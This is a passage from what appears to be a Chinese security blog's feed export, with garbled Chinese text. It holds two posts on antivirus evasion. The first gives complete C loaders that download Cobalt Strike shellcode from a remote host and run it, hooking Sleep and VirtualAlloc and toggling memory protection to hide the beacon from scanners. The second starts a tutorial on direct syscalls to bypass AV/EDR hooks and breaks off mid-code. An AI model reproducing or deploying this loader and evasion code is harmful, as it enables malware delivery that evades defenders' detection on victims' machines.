<span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//è®¡ç®—åç§»</span></span><br><span class="line">	DWORD SleepOffest = (DWORD)NewSleep - (DWORD)OldSleep - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//å¾—åˆ°pSleepData</span></span><br><span class="line">	RtlCopyMemory(&amp;pSleepData[<span class="number">1</span>], &amp;SleepOffest, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line">	<span class="comment">//ä¿®æ”¹å†…å­˜å±æ€§å¯å†™ï¼Œä¿å­˜åŸå…ˆå†…å­˜å±æ€§åˆ°OldSleepProtect</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldSleepProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ä¿®æ”¹å®Œçš„pSleepDataè¦†ç›–æ‰åŸå§‹çš„Sleep</span></span><br><span class="line">	RtlCopyMemory(OldSleep, pSleepData, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ä¿®æ”¹ä¸ºåŸå†…å­˜å±æ€§</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, OldSleepProtect, &amp;OldSleepProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//è¿˜åŸç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(OldSleep, g_OldSleepData, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­æŠ¥é”™ä½ç½®æ˜¯å¦åœ¨ç”³è¯·çš„å†…å­˜åŒºåŸŸä¸­ï¼Œå¦‚æœæœ‰åœ¨èµ‹äºˆå¯æ‰§è¡Œå±æ€§</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + g_dwSize) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ä¸ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span> &#123;</span><br><span class="line">	<span class="comment">//printf(&quot;å¼‚å¸¸é”™è¯¯ç :%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;çº¿ç¨‹åœ°å€:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;æ¢å¤å¯æ‰§è¡Œå†…å­˜å±æ€§\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">SetNoExecutableProtect</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//ç­‰å¾…è§£é”</span></span><br><span class="line">		WaitForSingleObject(hEvent, INFINITE);</span><br><span class="line">		<span class="comment">//printf(&quot;è®¾ç½®Beaconå†…å­˜å±æ€§ä¸å¯æ‰§è¡Œ\n&quot;);</span></span><br><span class="line">		<span class="comment">//VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_NOACCESS, &amp;Beacon_OldProtect);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//è®¾ç½®äº‹ä»¶ä¸ºæœªè¢«é€šçŸ¥çš„ï¼Œé‡æ–°ä¸Šé”</span></span><br><span class="line">		ResetEvent(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//è®¾ç½®äº‹ä»¶ä¸ºæœ‰ä¿¡å·äº‹ä»¶ å¤„äºé€šçŸ¥çŠ¶æ€</span></span><br><span class="line">	HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	AddVectoredExceptionHandler(<span class="number">1</span>, &amp;VectoredExceptionHandler);</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	HookSleep();</span><br><span class="line"></span><br><span class="line">	HANDLE hthread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, SetNoExecutableProtect, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hthread);</span><br><span class="line"></span><br><span class="line">	HINTERNET hInternet = InternetOpenA(<span class="string">&quot;aa&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	HINTERNET hConnect = InternetConnectA(hInternet, <span class="string">&quot;192.168.181.132&quot;</span>, <span class="number">80</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_SERVICE_HTTP, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HINTERNET hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/shellcode&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	LPVOID exec = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x400000</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwRealWord;</span><br><span class="line">	BOOL response = InternetReadFile(hRequest, exec, <span class="number">0x400000</span>, &amp;dwRealWord);</span><br><span class="line">	((<span class="type">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">	unHookSleep();</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä»£ç è¿˜æ˜¯æœ‰ä¸è¶³ä¹‹å¤„ å½“æœ‰åˆ«çš„è¡Œä¸ºå»ç”³è¯·å†…å­˜ï¼Œä¼šå¯¼è‡´ä¹‹å‰çš„Beaconçš„å†…å­˜ä½ç½®è¢«è¦†ç›–æ‰ï¼Œåœ¨is_Exceptionæœ‰å‡ºç°é—®é¢˜å¯¼è‡´æ— æ³•ä¸Šçº¿</p>
<p>è¯¥æ–¹æ³•å¯ä»¥å‹‰å¼ºè¿‡windowsdefender ä½¿ç”¨æ•æ„ŸåŠ¨ä½œè¿˜æ˜¯ä¼šè¢«æ€ï¼Œè¿˜æ˜¯ä¼šè¯†åˆ«å‡ºcsçš„ç‰¹å¾</p>
<p>ç”±äºæ˜¯ä½¿ç”¨çš„è¿œç¨‹åŠ è½½ï¼Œå¡å·´ç¦æ­¢è¿œç¨‹ä¸‹è½½åŠŸèƒ½ æ‰€ä»¥ä¹Ÿæ²¡æ³•è¿‡ã€‚</p>
<p>ä½¿ç”¨detoursä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/detours.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _x64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;lib.X64/detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;lib.X86/detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">LPVOID BASE_ADDRESS;</span><br><span class="line">SIZE_T g_dwSize;</span><br><span class="line">DWORD Beacon_OldProtect;</span><br><span class="line">HANDLE hEvent;</span><br><span class="line">BOOL Vir_FLAG = TRUE;</span><br><span class="line">LPVOID shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UnHook</span><span class="params">()</span>;</span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span>;</span><br><span class="line"><span class="comment">//LPVOID OldSleep = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;Sleep&quot;);</span></span><br><span class="line"><span class="comment">//LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;VirtualAlloc&quot;);</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">VOID</span><span class="params">(WINAPI *OldSleep)</span><span class="params">(DWORD dwMilliseconds)</span> = Sleep;</span><br><span class="line"><span class="type">static</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI *OldVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> = VirtualAlloc;</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (Vir_FLAG)</span><br><span class="line">	&#123;</span><br><span class="line">		VirtualFree(shellcode_addr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		Vir_FLAG = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line"></span><br><span class="line">	BASE_ADDRESS = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­æŠ¥é”™ä½ç½®æ˜¯å¦åœ¨ç”³è¯·çš„å†…å­˜åŒºåŸŸä¸­ï¼Œå¦‚æœæœ‰åœ¨èµ‹äºˆå¯æ‰§è¡Œå±æ€§</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + g_dwSize) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ä¸ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span> &#123;</span><br><span class="line">	<span class="comment">//printf(&quot;å¼‚å¸¸é”™è¯¯ç :%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;çº¿ç¨‹åœ°å€:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;æ¢å¤å¯æ‰§è¡Œå†…å­˜å±æ€§\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">SetNoExecutableProtect</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//ç­‰å¾…è§£é”</span></span><br><span class="line">		WaitForSingleObject(hEvent, INFINITE);</span><br><span class="line">		<span class="comment">//printf(&quot;è®¾ç½®Beaconå†…å­˜å±æ€§ä¸å¯æ‰§è¡Œ\n&quot;);</span></span><br><span class="line">		<span class="comment">//VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_NOACCESS, &amp;Beacon_OldProtect);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//è®¾ç½®äº‹ä»¶ä¸ºæœªè¢«é€šçŸ¥çš„ï¼Œé‡æ–°ä¸Šé”</span></span><br><span class="line">		ResetEvent(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DetourRestoreAfterWith(); <span class="comment">//é¿å…é‡å¤HOOK</span></span><br><span class="line">	DetourTransactionBegin(); <span class="comment">// å¼€å§‹HOOK</span></span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line">	DetourAttach((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	DetourAttach((PVOID*)&amp;OldSleep, NewSleep);</span><br><span class="line">	DetourTransactionCommit(); <span class="comment">//  æäº¤HOOK</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UnHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DetourTransactionBegin();</span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line">	DetourDetach((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//è®¾ç½®äº‹ä»¶ä¸ºæœ‰ä¿¡å·äº‹ä»¶ å¤„äºé€šçŸ¥çŠ¶æ€</span></span><br><span class="line">	HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	AddVectoredExceptionHandler(<span class="number">1</span>, &amp;VectoredExceptionHandler);</span><br><span class="line">	Hook();</span><br><span class="line"></span><br><span class="line">	HANDLE hthread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, SetNoExecutableProtect, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hthread);</span><br><span class="line"></span><br><span class="line">	HINTERNET hInternet = InternetOpenA(<span class="string">&quot;aa&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	HINTERNET hConnect = InternetConnectA(hInternet, <span class="string">&quot;192.168.181.132&quot;</span>, <span class="number">80</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_SERVICE_HTTP, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HINTERNET hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/shellcode&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x400000</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwRealWord;</span><br><span class="line">	BOOL response = InternetReadFile(hRequest, shellcode_addr, <span class="number">0x400000</span>, &amp;dwRealWord);</span><br><span class="line">	<span class="comment">//æŠŠshellcode_addrå¼ºåˆ¶è½¬æ¢ä¸ºä¸€ä¸ªè¿”å›voidç±»å‹çš„å‡½æ•°æŒ‡é’ˆç„¶åæ‰§è¡Œ</span></span><br><span class="line">    ((<span class="type">void</span>(*)())shellcode_addr)();</span><br><span class="line"></span><br><span class="line">	UnHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://macchiato.ink/hst/bypassav/VEH/#PVECTORED-EXCEPTION-HANDLER">https://macchiato.ink/hst/bypassav/VEH/#PVECTORED-EXCEPTION-HANDLER</a></p>
<p><a href="https://forum.butian.net/share/783">https://forum.butian.net/share/783</a></p>
<p><a href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14742672.html">https://www.cnblogs.com/zpchcbd/p/14742672.html</a></p>
]]></content>
      <categories>
        <category>VEH</category>
      </categories>
      <tags>
        <tag>VEH</tag>
      </tags>
  </entry>
  <entry>
    <title>Syscall-ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è§„é¿æ€è½¯Hook</title>
    <url>/posts/b3138fd/</url>
    <content><![CDATA[<h3 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h3><p>x86 windows ä½¿ç”¨ sysenter å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œx64 windows ä½¿ç”¨ <strong>syscall</strong> å®ç°ç³»ç»Ÿè°ƒç”¨ã€‚<br>syscallå·²ç»æˆä¸ºäº†ç»•è¿‡AV/EDRæ‰€ä½¿ç”¨çš„ä¸»æµæ–¹å¼ï¼Œå¯ä»¥ç”¨å®ƒç»•è¿‡ä¸€äº›æ•æ„Ÿå‡½æ•°çš„è°ƒç”¨ç›‘æ§(R3)ã€‚ä¸»æµçš„AV/EDRéƒ½ä¼šå¯¹æ•æ„Ÿå‡½æ•°è¿›è¡ŒHOOKï¼Œè€Œsyscallåˆ™å¯ä»¥ç”¨æ¥ç»•è¿‡è¯¥ç±»æ£€æµ‹ã€‚<br>ï¼ˆå¯ä»¥é€šè¿‡<code>https://j00ru.vexillium.org/syscalls/nt/64/</code>æŸ¥è¯¢å„ç³»ç»Ÿ64ä½ç³»ç»Ÿè°ƒç”¨å·<br> <code>https://j00ru.vexillium.org/syscalls/nt/32/</code> æŸ¥è¯¢å„ç³»ç»Ÿ32ä½ç³»ç»Ÿè°ƒç”¨å·ï¼‰</p>
<h4 id="ç®€å•åˆ†æWindowsAPIè°ƒç”¨è¿‡ç¨‹"><a href="#ç®€å•åˆ†æWindowsAPIè°ƒç”¨è¿‡ç¨‹" class="headerlink" title="ç®€å•åˆ†æWindowsAPIè°ƒç”¨è¿‡ç¨‹"></a>ç®€å•åˆ†æWindowsAPIè°ƒç”¨è¿‡ç¨‹</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">Thread</span><span class="params">(LPVOID lpParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨process monitor æŸ¥çœ‹è¯¥è¿›ç¨‹è°ƒç”¨è¿‡ç¨‹ ä»CreateThread -&gt; CreateRemoteThreadEx -&gt;NtCreateThreadEx æœ€åè¿›å…¥å†…æ ¸<br><img src="/posts/b3138fd/1.png"></p>
<h4 id="ç³»ç»Ÿè°ƒç”¨å·"><a href="#ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å·"></a>ç³»ç»Ÿè°ƒç”¨å·</h4><p>ä½¿ç”¨IDAæŸ¥çœ‹ntdll.dll<br>ç®€å•çœ‹ä¸‹R3å‡½æ•°çš„åº•å±‚å®ç°</p>
<p>NtAllocateVirtualMemoryEx<br><img src="/posts/b3138fd/2.png"></p>
<p>NtWriteVirtualMemory<br><img src="/posts/b3138fd/3.png"></p>
<p>NtCreateThreadEx<br><img src="/posts/b3138fd/4.png"><br>è¿™å‡ ä¸ªå‡½æ•°å½¢å¼åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸€è‡´çš„ ï¼Œåªæœ‰ç³»ç»Ÿè°ƒç”¨å·ä¸åŒã€‚å°†å‚æ•°æ”¾å…¥eax çš„76h ä¸º ssdtè¡¨ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ä¸­ï¼Œç„¶åå†åˆ¤æ–­æ˜¯å¦æ˜¯syscallçš„æ–¹å¼è¿›å…¥å†…æ ¸ï¼Œå¦‚æœä¸æ”¯æŒå°±ä½¿ç”¨å³è¾¹çš„è°ƒç”¨æ–¹å¼ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.code</span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">	mov     r10, rcx    </span><br><span class="line">	mov     eax, 76h  ;å°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥eax  </span><br><span class="line">	syscall           ;è¿›å…¥å†…æ ¸å±‚</span><br><span class="line">	ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h4 id="Syscall-1"><a href="#Syscall-1" class="headerlink" title="Syscall"></a>Syscall</h4><h5 id="åŸºç¡€çš„syscallä»£ç å®ç°"><a href="#åŸºç¡€çš„syscallä»£ç å®ç°" class="headerlink" title="åŸºç¡€çš„syscallä»£ç å®ç°"></a>åŸºç¡€çš„syscallä»£ç å®ç°</h5><p>å°†ç”¨åˆ°çš„APIå†™åˆ°syscall.asmä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.code </span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">mov     r10, rcx      </span><br><span class="line">mov     eax, 76h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line"></span><br><span class="line">NtWriteVirtualMemoryProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 03Ah</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtWriteVirtualMemoryProc endp</span><br><span class="line"></span><br><span class="line">NtCreateThreadExProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 0C1h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtCreateThreadExProc endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥asmä¸‹å±æ€§ä¸­å•ç‹¬è®¾ç½®ä»¥ä¸‹é…ç½®:<br>ml64 /c %(fileName).asm<br>%(fileName).obj;<br><img src="/posts/b3138fd/5.png"></p>
<p><img src="/posts/b3138fd/6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtAllocateVirtualMemoryExProc</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtWriteVirtualMemoryProc</span><span class="params">(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,ULONG BufferLength,PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtCreateThreadExProc</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span><br><span 